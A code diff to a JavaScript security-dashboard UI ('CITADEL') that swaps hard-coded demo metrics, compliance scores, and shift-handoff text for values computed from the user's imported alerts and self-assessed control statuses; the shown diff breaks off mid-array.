@@ -2336,6 +2480,12 @@ export function renderCitadel(main) {
 
     var detail = selectedAlert ? ALERTS.find(function(a){return a.id===selectedAlert}) : null;
 
+    if (!ALERTS.length) {
+      c.innerHTML = ctEmptyState('No alerts yet. Paste or upload logs to triage them.', 'Import logs', 'logs');
+      wireEmptyActions(c);
+      return;
+    }
+
     c.innerHTML =
       '<div class="ct-filter-row" style="margin-bottom:8px">' +
         '<select class="ct-sel" id="ct-triage-status">' +
@@ -2353,7 +2503,7 @@ export function renderCitadel(main) {
         '</select>' +
         '<span style="flex:1"></span>' +
         '<span style="color:var(--mut);font-size:.65rem">' + filtered.length + ' alerts</span>' +
-        '<button class="ct-btn ct-btn-sm" id="ct-triage-graph" title="Demo alert data is tagged simulated"' + (filtered.length ? '' : ' disabled') + '>Send ' + filtered.length + ' alerts to Security Graph</button>' +
+        '<button class="ct-btn ct-btn-sm" id="ct-triage-graph" title="Alerts from the example dataset are tagged simulated"' + (filtered.length ? '' : ' disabled') + '>Send ' + filtered.length + ' alerts to Security Graph</button>' +
       '</div>' +
 
       '<div class="ct-grid2">' +
@@ -2467,7 +2617,7 @@ export function renderCitadel(main) {
                   '<button class="ct-btn ct-btn-sm ct-btn-ghost" data-action="fp">Close as FP</button>' +
                   '<button class="ct-btn ct-btn-sm" style="border-color:#00e676;color:#00e676" data-action="resolve">Resolve</button>' +
                   '<button class="ct-btn ct-btn-sm ct-btn-ghost">Export PDF</button>' +
-                  '<button class="ct-btn ct-btn-sm" id="ct-alert-graph" title="Demo alert data is tagged simulated">Send to Security Graph</button>' +
+                  '<button class="ct-btn ct-btn-sm" id="ct-alert-graph" title="Alerts from the example dataset are tagged simulated">Send to Security Graph</button>' +
                 '</div>' +
               '</div>' +
             '</div>' +
@@ -2542,11 +2692,11 @@ export function renderCitadel(main) {
         var a = ALERTS.find(function(x){return x.id===selectedAlert});
         if (!a) return;
         var act = btn.dataset.action;
-        if (act==='assign') { a.analyst = a.analyst || 'Analyst-1'; a.status = 'Investigating'; }
-        else if (act==='investigate') { a.status = 'Investigating'; a.analyst = a.analyst || 'Analyst-1'; }
-        else if (act==='escalate') { a.status = 'Escalated'; }
-        else if (act==='fp') { a.status = 'Resolved'; }
-        else if (act==='resolve') { a.status = 'Resolved'; }
+        if (act==='assign') { a.analyst = a.analyst || 'You'; a.status = 'Investigating'; }
+        else if (act==='investigate') { a.status = 'Investigating'; a.analyst = a.analyst || 'You'; }
+        else if (act==='escalate') { a.status = 'Escalated'; a.escalated = true; }
+        else if (act==='fp') { a.status = 'Resolved'; a.fp = true; a.closedAt = Date.now(); }
+        else if (act==='resolve') { a.status = 'Resolved'; a.fp = false; a.closedAt = Date.now(); }
         renderTriage(c);
       };
     });
@@ -2735,18 +2885,23 @@ export function renderCitadel(main) {
   function renderComplianceTab(c) {
     var fw = COMPLIANCE[complianceFramework];
     if (!fw) { c.innerHTML = '<div class="ct-panel"><div class="ct-panel-b">Framework not found</div></div>'; return; }
+    function statusOf(ctrl) { return COMPLIANCE_STATUS[complianceFramework + '|' + ctrl.id] || ''; }
+    var STATUS_LABEL = {'':'Not assessed', pass:'PASS', partial:'PARTIAL', fail:'FAIL'};
+    var STATUS_BADGE = {'':'', pass:'ct-low', partial:'ct-med', fail:'ct-crit'};
 
-    var totalControls = 0, passCount = 0, partialCount = 0, failCount = 0, totalScore = 0;
+    var totalControls = 0, passCount = 0, partialCount = 0, failCount = 0, assessed = 0;
     fw.categories.forEach(function(cat) {
       cat.controls.forEach(function(ctrl) {
         totalControls++;
-        totalScore += ctrl.score;
-        if (ctrl.status === 'pass') passCount++;
-        else if (ctrl.status === 'partial') partialCount++;
-        else failCount++;
+        var st = statusOf(ctrl);
+        if (st) assessed++;
+        if (st === 'pass') passCount++;
+        else if (st === 'partial') partialCount++;
+        else if (st === 'fail') failCount++;
       });
     });
-    var avgScore = Math.round(totalScore / totalControls);
+    // Score = share of assessed controls passing (partial counts half). None assessed -> no score.
+    var score = assessed ? Math.round((passCount + partialCount * 0.5) / assessed * 100) : null;
 
     c.innerHTML =
       '<div class="ct-compliance-bar" style="margin-bottom:12px">' +
@@ -2755,12 +2910,14 @@ export function renderCitadel(main) {
         '<button class="ct-compliance-btn' + (complianceFramework==='soc2'?' on':'') + '" data-fw="soc2">SOC 2 Type II</button>' +
       '</div>' +
 
+      (assessed ? '' : ctEmptyState('No controls assessed yet. Set a status on each control below to build your ' + fw.name + ' posture.')) +
+
       '<div class="ct-grid4" style="margin-bottom:12px">' +
-        '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--acc)">' + avgScore + '<span style="font-size:.6rem">%</span></div><div class="ct-stat-l">Overall Score</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--acc)">' + ctFmt(score, '%') + '</div><div class="ct-stat-l">Overall Score</div></div>' +
         '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + passCount + '</div><div class="ct-stat-l">Passing</div></div>' +
         '<div class="ct-stat"><div class="ct-stat-v" style="color:#ffd600">' + partialCount + '</div><div class="ct-stat-l">Partial</div></div>' +
         '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">' + failCount + '</div><div class="ct-stat-l">Failing</div></div>' +
-        '<div class="ct-stat"><div class="ct-stat-v">' + totalControls + '</div><div class="ct-stat-l">Total Controls</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v">' + assessed + ' / ' + totalControls + '</div><div class="ct-stat-l">Controls Assessed</div></div>' +
       '</div>' +
 
       '<div class="ct-panel" style="margin-bottom:12px">' +
@@ -2768,14 +2925,15 @@ export function renderCitadel(main) {
         '<div class="ct-panel-b">' +
           '<div style="display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap">' +
             fw.categories.map(function(cat) {
-              var catPass = cat.controls.filter(function(c2){return c2.status==='pass'}).length;
+              var catPass = cat.controls.filter(function(c2){return statusOf(c2)==='pass'}).length;
+              var catAssessed = cat.controls.filter(function(c2){return statusOf(c2)}).length;
               var catTotal = cat.controls.length;
               var catPct = Math.round(catPass / catTotal * 100);
               return '<div class="ct-stat" style="min-width:120px">' +
                 '<div style="font-size:.62rem;color:var(--acc);font-weight:600">' + esc(cat.id) + '</div>' +
                 '<div style="font-size:.68rem;margin-top:2px">' + esc(cat.name) + '</div>' +
                 '<div class="ct-gauge" style="margin-top:6px"><div class="ct-gauge-fill" style="width:' + catPct + '%;background:' + (catPct>=80?'#00e676':catPct>=60?'#ffd600':'#ff1744') + '"></div></div>' +
-                '<div style="font-size:.6rem;color:var(--mut);margin-top:2px">' + catPass + '/' + catTotal + ' passing</div>' +
+                '<div style="font-size:.6rem;color:var(--mut);margin-top:2px">' + (catAssessed ? catPass + '/' + catTotal + ' passing' : 'Not assessed') + '</div>' +
               '</div>';
             }).join('') +
           '</div>' +
@@ -2787,19 +2945,19 @@ export function renderCitadel(main) {
           '<div class="ct-panel-h">' + esc(cat.id) + ' - ' + esc(cat.name) + '</div>' +
           '<div class="ct-panel-b">' +
             '<table class="ct-tbl">' +
-              '<thead><tr><th>Control</th><th>Name</th><th>Status</th><th>Score</th><th>Detail</th></tr></thead>' +
+              '<thead><tr><th>Control</th><th>Name</th><th>Status</th><th>Your Assessment</th><th>Objective</th></tr></thead>' +
               '<tbody>' +
                 cat.controls.map(function(ctrl) {
-                  var statusBadge = ctrl.status==='pass'?'ct-low':ctrl.status==='partial'?'ct-med':'ct-crit';
-                  var statusLabel = ctrl.status==='pass'?'PASS':ctrl.status==='partial'?'PARTIAL':'FAIL';
+                  var st = statusOf(ctrl);
                   return '<tr>' +
                     '<td style="color:var(--acc);font-size:.62rem;font-weight:600">' + esc(ctrl.id) + '</td>' +
                     '<td style="font-size:.68rem">' + esc(ctrl.name) + '</td>' +
-                    '<td><span class="ct-badge ' + statusBadge + '">' + statusLabel + '</span></td>' +
-                    '<td>' +
-                      '<div class="ct-gauge" style="width:60px;display:inline-block;vertical-align:middle;margin-right:6px"><div class="ct-gauge-fill" style="width:' + ctrl.score + '%;background:' + (ctrl.score>=80?'#00e676':ctrl.score>=60?'#ffd600':'#ff1744') + '"></div></div>' +
-                      '<span style="font-size:.62rem;font-weight:600">' + ctrl.score + '%</span>' +
-                    '</td>' +
+                    '<td>' + (st ? '<span class="ct-badge ' + STATUS_BADGE[st] + '">' + STATUS_LABEL[st] + '</span>' : '<span style="font-size:.6rem;color:var(--mut)">Not assessed</span>') + '</td>' +
+                    '<td><select class="ct-sel" data-ctrl="' + esc(ctrl.id) + '" style="padding:3px 6px;font-size:.62rem">' +
+                      ['', 'pass', 'partial', 'fail'].map(function(v) {
+                        return '<option value="' + v + '"' + (v === st ? ' selected' : '') + '>' + (v ? STATUS_LABEL[v].charAt(0) + STATUS_LABEL[v].slice(1).toLowerCase() : 'Not assessed') + '</option>';
+                      }).join('') +
+                    '</select></td>' +
                     '<td style="font-size:.62rem;color:var(--mut)">' + esc(ctrl.detail) + '</td>' +
                   '</tr>';
                 }).join('') +
@@ -2816,23 +2974,24 @@ export function renderCitadel(main) {
             var gaps = [];
             fw.categories.forEach(function(cat) {
               cat.controls.forEach(function(ctrl) {
-                if (ctrl.status !== 'pass') {
-                  gaps.push({cat:cat.id+' '+cat.name,id:ctrl.id,name:ctrl.name,status:ctrl.status,score:ctrl.score,detail:ctrl.detail});
+                var st = statusOf(ctrl);
+                if (st === 'fail' || st === 'partial') {
+                  gaps.push({cat:cat.id+' '+cat.name,id:ctrl.id,name:ctrl.name,status:st,detail:ctrl.detail});
                 }
               });
             });
-            if (gaps.length === 0) return '<div style="font-size:.72rem;color:#00e676;text-align:center;padding:20px">All controls passing</div>';
+            if (!assessed) return '<div class="ct-empty">Gaps appear here once you mark controls as Partial or Fail.</div>';
+            if (gaps.length === 0) return '<div style="font-size:.72rem;color:#00e676;text-align:center;padding:20px">No gaps among assessed controls</div>';
             return '<table class="ct-tbl">' +
-              '<thead><tr><th>Category</th><th>Control</th><th>Status</th><th>Score</th><th>Gap Detail</th><th>Remediation Priority</th></tr></thead>' +
+              '<thead><tr><th>Category</th><th>Control</th><th>Status</th><th>Objective</th><th>Remediation Priority</th></tr></thead>' +
               '<tbody>' +
               gaps.map(function(g) {
-                var priority = g.score < 50 ? 'P1 - Immediate' : g.score < 70 ? 'P2 - 30 Days' : 'P3 - 90 Days';
-                var prioColor = g.score < 50 ? '#ff1744' : g.score < 70 ? '#ff9100' : '#ffd600';
+                var priority = g.status === 'fail' ? 'P1 - Immediate' : 'P2 - 30 Days';
+                var prioColor = g.status === 'fail' ? '#ff1744' : '#ff9100';
                 return '<tr>' +
                   '<td style="font-size:.62rem;color:var(--mut)">' + esc(g.cat) + '</td>' +
                   '<td style="font-size:.62rem"><span style="color:var(--acc)">' + esc(g.id) + '</span> ' + esc(g.name) + '</td>' +
                   '<td><span class="ct-badge ' + (g.status==='fail'?'ct-crit':'ct-med') + '">' + g.status.toUpperCase() + '</span></td>' +
-                  '<td style="font-weight:600;color:' + (g.score<50?'#ff1744':g.score<70?'#ff9100':'#ffd600') + '">' + g.score + '%</td>' +
                   '<td style="font-size:.6rem;color:var(--mut)">' + esc(g.detail) + '</td>' +
                   '<td style="font-size:.62rem;font-weight:600;color:' + prioColor + '">' + priority + '</td>' +
                 '</tr>';
@@ -2840,61 +2999,6 @@ export function renderCitadel(main) {
               '</tbody></table>';
           })() +
         '</div>' +
-      '</div>' +
-
-      '<div class="ct-panel" style="margin-top:12px">' +
-        '<div class="ct-panel-h">Remediation Roadmap</div>' +
-        '<div class="ct-panel-b">' +
-          [
-            {phase:'Phase 1: Critical Fixes (0-30 days)',items:['Apply CIS benchmarks to cloud workloads (CIS 4.1, NIST PR.PS-01)','Complete app control policy enforcement on all endpoints (CIS 2.3)','Automate data retention enforcement (CIS 3.4)'],color:'#ff1744'},
-            {phase:'Phase 2: High Priority (30-60 days)',items:['Improve third-party risk assessment process (NIST GV.SC-01)','Document regulatory notification procedures (NIST RS.MA-03)','Increase vendor assessment frequency (SOC2 CC9.2)','Implement internal network flow logging (CIS 13.6)'],color:'#ff9100'},
-            {phase:'Phase 3: Improvement (60-90 days)',items:['Test stakeholder communication plan (NIST RC.CO-01)','Improve risk prioritization consistency (NIST ID.RA-05)','Encrypt remaining file shares (NIST PR.DS-01)','Conduct tabletop exercises for incident response (SOC2 CC7.4)'],color:'#ffd600'},
-          ].map(function(p) {
-            return '<div style="margin-bottom:12px">' +
-              '<div style="font-size:.72rem;font-weight:600;color:' + p.color + ';margin-bottom:6px;padding-bottom:4px;border-bottom:2px solid ' + p.color + '">' + esc(p.phase) + '</div>' +
-              p.items.map(function(item) {
-                return '<div style="display:flex;align-items:center;gap:8px;padding:4px 0;font-size:.65rem">' +
-                  '<span style="width:14px;height:14px;border:1px solid var(--line);border-radius:2px;flex-shrink:0"></span>' +
-                  '<span>' + esc(item) + '</span>' +
-                '</div>';
-              }).join('') +
-            '</div>';
-          }).join('') +
-        '</div>' +
-      '</div>' +
-
-      '<div class="ct-panel" style="margin-top:12px">' +
-        '<div class="ct-panel-h">Compliance Trend (Last 6 Months)</div>' +
-        '<div class="ct-panel-b">' +
-          '<table class="ct-tbl">' +
-            '<thead><tr><th>Month</th><th>Overall Score</th><th>Passing</th><th>Partial</th><th>Failing</th><th>Change</th></tr></thead>' +
-            '<tbody>' +
-              [
-                {month:'Apr 2026',score:68,pass:18,partial:8,fail:4,change:'+3'},
-                {month:'May 2026',score:71,pass:19,partial:8,fail:3,change:'+3'},
-                {month:'Jun 2026',score:74,pass:21,partial:7,fail:2,change:'+3'},
-                {month:'Jul 2026',score:76,pass:22,partial:6,fail:2,change:'+2'},
-                {month:'Aug 2026',score:79,pass:23,partial:6,fail:1,change:'+3'},
-                {month:'Sep 2026',score:avgScore,pass:passCount,partial:partialCount,fail:failCount,change:'+' + (avgScore - 79)},
-              ].map(function(m) {
-                return '<tr>' +
-                  '<td style="font-weight:600">' + esc(m.month) + '</td>' +
-                  '<td style="color:' + (m.score>=80?'#00e676':m.score>=70?'#ffd600':'#ff9100') + ';font-weight:600">' + m.score + '%</td>' +
-                  '<td style="color:#00e676">' + m.pass + '</td>' +
-                  '<td style="color:#ffd600">' + m.partial + '</td>' +
-                  '<td style="color:#ff1744">' + m.fail + '</td>' +
-                  '<td style="color:#00e676;font-weight:600">' + m.change + '</td>' +
-                '</tr>';
-              }).join('') +
-            '</tbody>' +
-          '</table>' +
-        '</div>' +
-      '</div>' +
-
-      '<div style="display:flex;gap:8px;margin-top:12px">' +
-        '<button class="ct-btn">Generate Compliance Report</button>' +
-        '<button class="ct-btn ct-btn-ghost">Export CSV</button>' +
-        '<button class="ct-btn ct-btn-ghost">Schedule Assessment</button>' +
       '</div>';
 
     c.querySelectorAll('.ct-compliance-btn').forEach(function(btn) {
@@ -2903,424 +3007,136 @@ export function renderCitadel(main) {
         renderComplianceTab(c);
       };
     });
+    c.querySelectorAll('select[data-ctrl]').forEach(function(sel) {
+      sel.onchange = function() {
+        var key = complianceFramework + '|' + sel.dataset.ctrl;
+        if (sel.value) COMPLIANCE_STATUS[key] = sel.value; else delete COMPLIANCE_STATUS[key];
+        renderComplianceTab(c);
+      };
+    });
   }
 
   // ========== METRICS ==========
+  // All values are computed from the user's alert queue (ctComputeMetrics).
+  // MTTR uses created -> resolved time recorded in Alert Triage; MTTD needs
+  // detection timestamps CITADEL does not have, so it shows an em dash.
   function renderMetrics(c) {
-    var m = SOC_METRICS;
-    var maxAlert = Math.max.apply(null, m.alertVolume.week);
-    var maxMttd = Math.max.apply(null, m.mttd.trend);
-    var maxMttr = Math.max.apply(null, m.mttr.trend);
-    var maxFp = Math.max.apply(null, m.falsePositiveRate.trend);
-    var days = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
+    var m = ctComputeMetrics();
+    if (!m.total) {
+      c.innerHTML = ctEmptyState('No metrics yet. SOC metrics are computed from the alerts you import and triage.', 'Import logs', 'logs');
+      wireEmptyActions(c);
+      return;
+    }
+    var maxDay = Math.max.apply(null, m.days.map(function(d){return d.count;}).concat([1]));
+    var analysts = Object.keys(m.analysts).map(function(k){return m.analysts[k];});
+    var tacticKeys = Object.keys(m.tactics).sort(function(a,b){return m.tactics[b]-m.tactics[a];});
+    var mapped = tacticKeys.reduce(function(s,k){return s+m.tactics[k];},0);
+    var assetKeys = Object.keys(m.assets).sort(function(a,b){return m.assets[b].alerts-m.assets[a].alerts;}).slice(0,8);
+    var crit = ALERTS.filter(function(a){return a.severity==='Critical'||a.severity==='High'}).length;
 
     c.innerHTML =
       '<div class="ct-grid4" style="margin-bottom:12px">' +
-        '<div class="ct-stat">' +
-          '<div class="ct-stat-v" style="color:' + (m.mttd.current<=m.mttd.target?'#00e676':'#ff9100') + '">' + m.mttd.current + '<span style="font-size:.6rem">min</span></div>' +
-          '<div class="ct-stat-l">MTTD (Target: ' + m.mttd.target + 'min)</div>' +
-        '</div>' +
-        '<div class="ct-stat">' +
-          '<div class="ct-stat-v" style="color:' + (m.mttr.current<=m.mttr.target?'#00e676':'#ff9100') + '">' + m.mttr.current + '<span style="font-size:.6rem">min</span></div>' +
-          '<div class="ct-stat-l">MTTR (Target: ' + m.mttr.target + 'min)</div>' +
-        '</div>' +
-        '<div class="ct-stat">' +
-          '<div class="ct-stat-v" style="color:' + (m.falsePositiveRate.current<=m.falsePositiveRate.target?'#00e676':'#ff9100') + '">' + m.falsePositiveRate.current + '<span style="font-size:.6rem">%</span></div>' +
-          '<div class="ct-stat-l">FP Rate (Target: ' + m.falsePositiveRate.target + '%)</div>' +
-        '</div>' +
-        '<div class="ct-stat"><div class="ct-stat-v">' + m.alertVolume.today + '</div><div class="ct-stat-l">Alerts Today</div></div>' +
-        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + m.closedToday + '</div><div class="ct-stat-l">Closed Today</div></div>' +
-        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff9100">' + m.openAlerts + '</div><div class="ct-stat-l">Open Alerts</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v">' + ctFmt(m.mttd, 'min') + '</div><div class="ct-stat-l">MTTD</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v">' + ctFmt(m.mttr, 'min') + '</div><div class="ct-stat-l">MTTR (created to resolved)</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v">' + ctFmt(m.fpRate, '%') + '</div><div class="ct-stat-l">FP Rate (of resolved)</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v">' + m.total + '</div><div class="ct-stat-l">Total Alerts</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + m.closed + '</div><div class="ct-stat-l">Resolved</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff9100">' + m.open + '</div><div class="ct-stat-l">Open Alerts</div></div>' +
         '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">' + m.criticalOpen + '</div><div class="ct-stat-l">Critical Open</div></div>' +
-        '<div class="ct-stat"><div class="ct-stat-v">' + m.escalationRate.current + '<span style="font-size:.6rem">%</span></div><div class="ct-stat-l">Escalation Rate</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v">' + ctFmt(m.escalationRate, '%') + '</div><div class="ct-stat-l">Escalation Rate</div></div>' +
       '</div>' +
 
       '<div class="ct-grid2" style="margin-bottom:12px">' +
         '<div class="ct-panel">' +
-          '<div class="ct-panel-h">Alert Volume Trend (7 days)</div>' +
+          '<div class="ct-panel-h">Alert Volume by Day</div>' +
           '<div class="ct-panel-b">' +
             '<div class="ct-trend" style="height:100px">' +
-              m.alertVolume.week.map(function(v,i) {
-                var h = Math.round((v/maxAlert)*100);
+              m.days.map(function(d) {
+                var h = Math.round((d.count/maxDay)*100);
                 return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
-                  '<div style="font-size:.55rem;color:var(--mut)">' + v + '</div>' +
+                  '<div style="font-size:.55rem;color:var(--mut)">' + d.count + '</div>' +
                   '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%"></div></div>' +
-                  '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
+                  '<div style="font-size:.5rem;color:var(--mut)">' + esc(d.day) + '</div>' +
                 '</div>';
               }).join('') +
             '</div>' +
           '</div>' +
         '</div>' +
         '<div class="ct-panel">' +
-          '<div class="ct-panel-h">MTTD Trend (7 days)</div>' +
+          '<div class="ct-panel-h">Alert Category Breakdown (ATT&CK tactic)</div>' +
           '<div class="ct-panel-b">' +
-            '<div class="ct-trend" style="height:100px">' +
-              m.mttd.trend.map(function(v,i) {
-                var h = Math.round((v/maxMttd)*100);
-                return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
-                  '<div style="font-size:.55rem;color:var(--mut)">' + v + 'm</div>' +
-                  '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%;background:' + (v<=m.mttd.target?'#00e676':'#ff9100') + '"></div></div>' +
-                  '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
-                '</div>';
-              }).join('') +
-            '</div>' +
-            '<div style="margin-top:4px;font-size:.55rem;color:var(--mut)">Target: ' + m.mttd.target + ' min</div>' +
+            (tacticKeys.length ? tacticKeys.map(function(t) {
+              var pct = Math.round(m.tactics[t] / mapped * 100);
+              return '<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;font-size:.62rem">' +
+                '<span style="min-width:110px;color:var(--mut)">' + esc(t) + '</span>' +
+                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + pct + '%;background:var(--acc)"></div></div>' +
+                '<span style="min-width:35px;text-align:right;font-weight:600">' + m.tactics[t] + '</span>' +
+                '<span style="min-width:25px;text-align:right;color:var(--mut)">' + pct + '%</span>' +
+              '</div>';
+            }).join('') : '<div class="ct-empty">None of your alerts carry an ATT&amp;CK technique ID yet.</div>') +
           '</div>' +
         '</div>' +
       '</div>' +
 
       '<div class="ct-grid2" style="margin-bottom:12px">' +
         '<div class="ct-panel">' +
-          '<div class="ct-panel-h">MTTR Trend (7 days)</div>' +
+          '<div class="ct-panel-h">Analyst Performance</div>' +
           '<div class="ct-panel-b">' +
-            '<div class="ct-trend" style="height:100px">' +
-              m.mttr.trend.map(function(v,i) {
-                var h = Math.round((v/maxMttr)*100);
-                return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
-                  '<div style="font-size:.55rem;color:var(--mut)">' + v + 'm</div>' +
-                  '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%;background:' + (v<=m.mttr.target?'#00e676':'#ff9100') + '"></div></div>' +
-                  '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
-                '</div>';
-              }).join('') +
-            '</div>' +
-            '<div style="margin-top:4px;font-size:.55rem;color:var(--mut)">Target: ' + m.mttr.target + ' min</div>' +
-          '</div>' +
-        '</div>' +
-        '<div class="ct-panel">' +
-          '<div class="ct-panel-h">False Positive Rate Trend (7 days)</div>' +
-          '<div class="ct-panel-b">' +
-            '<div class="ct-trend" style="height:100px">' +
-              m.falsePositiveRate.trend.map(function(v,i) {
-                var h = Math.round((v/maxFp)*100);
-                return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
-                  '<div style="font-size:.55rem;color:var(--mut)">' + v + '%</div>' +
-                  '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%;background:' + (v<=m.falsePositiveRate.target?'#00e676':'#ff9100') + '"></div></div>' +
-                  '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
-                '</div>';
-              }).join('') +
-            '</div>' +
-            '<div style="margin-top:4px;font-size:.55rem;color:var(--mut)">Target: ' + m.falsePositiveRate.target + '%</div>' +
-          '</div>' +
-        '</div>' +
-      '</div>' +
-
-      '<div class="ct-panel" style="margin-bottom:12px">' +
-        '<div class="ct-panel-h">Analyst Performance</div>' +
-        '<div class="ct-panel-b">' +
-          '<table class="ct-tbl">' +
-            '<thead><tr><th>Analyst</th><th>Open</th><th>Closed (24h)</th><th>Avg Resolution</th><th>Workload</th></tr></thead>' +
-            '<tbody>' +
-              m.analystLoad.map(function(a) {
-                var loadPct = Math.round(a.open / 30 * 100);
-                return '<tr>' +
-                  '<td><div style="display:flex;align-items:center;gap:6px"><div class="ct-analyst-avatar" style="width:22px;height:22px;font-size:.55rem">' + a.name.charAt(a.name.length-1) + '</div>' + esc(a.name) + '</div></td>' +
-                  '<td style="font-weight:600;color:' + (a.open>20?'#ff1744':a.open>15?'#ff9100':'var(--txt)') + '">' + a.open + '</td>' +
-                  '<td style="color:#00e676;font-weight:600">' + a.closed + '</td>' +
-                  '<td>' + a.avgTime + ' min</td>' +
-                  '<td><div class="ct-gauge" style="width:80px;display:inline-block;vertical-align:middle;margin-right:4px"><div class="ct-gauge-fill" style="width:' + Math.min(100,loadPct) + '%;background:' + (loadPct>75?'#ff1744':loadPct>50?'#ff9100':'#00e676') + '"></div></div><span style="font-size:.6rem">' + loadPct + '%</span></td>' +
-                '</tr>';
-              }).join('') +
-            '</tbody>' +
-          '</table>' +
-        '</div>' +
-      '</div>' +
-
-      '<div class="ct-panel">' +
-        '<div class="ct-panel-h">Shift Handoff Report</div>' +
-        '<div class="ct-panel-b">' +
-          m.shifts.map(function(s) {
-            return '<div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid var(--line);font-size:.68rem">' +
-              '<div style="min-width:160px;font-weight:600">' + esc(s.shift) + '</div>' +
-              '<div style="min-width:100px">Lead: <span style="color:var(--acc)">' + esc(s.lead) + '</span></div>' +
-              '<div style="flex:1;color:var(--mut)">Team: ' + s.analysts.join(', ') + '</div>' +
-              '<div style="font-weight:600">' + s.alerts + ' alerts processed</div>' +
-            '</div>';
-          }).join('') +
-          '<div style="margin-top:12px">' +
-            '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Handoff Notes</div>' +
-            '<div class="ct-yaml">' +
-              'SHIFT HANDOFF - Day to Swing\n' +
-              '================================\n' +
-              'Active Incidents:\n' +
-              '  - INC-2026-0921-001: Cobalt Strike C2 detected on WS-JSMITH-01\n' +
-              '    Status: Investigating | Analyst-1 leading\n' +
-              '    Host isolated, forensic image in progress\n' +
-              '  - INC-2026-0921-002: Data exfiltration attempt from 10.0.2.100\n' +
-              '    Status: Escalated to IR | 450MB transferred before block\n' +
-              '    Outbound traffic blocked, evidence preserved\n\n' +
-              'Pending Items:\n' +
-              '  - 15 New alerts in queue (3 Critical)\n' +
-              '  - AWS IAM backdoor user needs remediation\n' +
-              '  - S3 bucket policy reverted, confirm with cloud team\n\n' +
-              'Notes:\n' +
-              '  - Threat actor IP 198.51.100.50 added to block list\n' +
-              '  - Password reset forced for compromised svc-admin account\n' +
-              '  - EDR signatures updated for Cobalt Strike variant' +
-            '</div>' +
-          '</div>' +
-        '</div>' +
-      '</div>' +
-
-      '<div class="ct-panel" style="margin-top:12px">' +
-        '<div class="ct-panel-h">SLA Performance</div>' +
-        '<div class="ct-panel-b">' +
-          '<table class="ct-tbl">' +
-            '<thead><tr><th>SLA Metric</th><th>Target</th><th>Current</th><th>Status</th><th>30-Day Avg</th><th>Trend</th></tr></thead>' +
-            '<tbody>' +
-              [
-                {metric:'Critical Alert Response',target:'5 min',current:'4.2 min',status:'pass',avg:'4.8 min',trend:'down'},
-                {metric:'High Alert Response',target:'15 min',current:'12.1 min',status:'pass',avg:'13.5 min',trend:'down'},
-                {metric:'Medium Alert Response',target:'60 min',current:'42.3 min',status:'pass',avg:'48.1 min',trend:'down'},
-                {metric:'Mean Time to Detect',target:'10 min',current:'12.0 min',status:'fail',avg:'13.2 min',trend:'down'},
-                {metric:'Mean Time to Respond',target:'30 min',current:'45.0 min',status:'fail',avg:'48.5 min',trend:'down'},
-                {metric:'False Positive Rate',target:'15%',current:'18%',status:'fail',avg:'20.1%',trend:'down'},
-                {metric:'Alert Closure Rate (24h)',target:'85%',current:'69.7%',status:'fail',avg:'72.3%',trend:'up'},
-                {metric:'Escalation Rate',target:'5%',current:'8%',status:'fail',avg:'7.2%',trend:'up'},
-                {metric:'Coverage Hours',target:'24/7',current:'24/7',status:'pass',avg:'24/7',trend:'flat'},
-                {metric:'Incident Report Time',target:'4 hours',current:'3.5 hours',status:'pass',avg:'3.8 hours',trend:'down'},
-              ].map(function(s) {
-                var trendIcon = s.trend==='down'?'v':s.trend==='up'?'^':'-';
-                var trendColor = (s.status==='pass' && s.trend==='down') || (s.status==='fail' && s.trend==='down') ? '#00e676' : s.trend==='up' ? '#ff9100' : 'var(--mut)';
-                return '<tr>' +
-                  '<td style="font-weight:600">' + esc(s.metric) + '</td>' +
-                  '<td style="color:var(--mut)">' + esc(s.target) + '</td>' +
-                  '<td style="font-weight:600">' + esc(s.current) + '</td>' +
-                  '<td><span class="ct-badge ' + (s.status==='pass'?'ct-low':'ct-high') + '">' + (s.status==='pass'?'MET':'MISS') + '</span></td>' +
-                  '<td style="color:var(--mut)">' + esc(s.avg) + '</td>' +
-                  '<td style="color:' + trendColor + ';font-weight:600;font-size:1rem">' + trendIcon + '</td>' +
-                '</tr>';
-              }).join('') +
-            '</tbody>' +
-          '</table>' +
-        '</div>' +
-      '</div>' +
-
-      '<div class="ct-grid2" style="margin-top:12px">' +
-        '<div class="ct-panel">' +
-          '<div class="ct-panel-h">Alert Category Breakdown</div>' +
-          '<div class="ct-panel-b">' +
-            [
-              {cat:'Credential Access',count:45,pct:16,color:'#ff1744'},
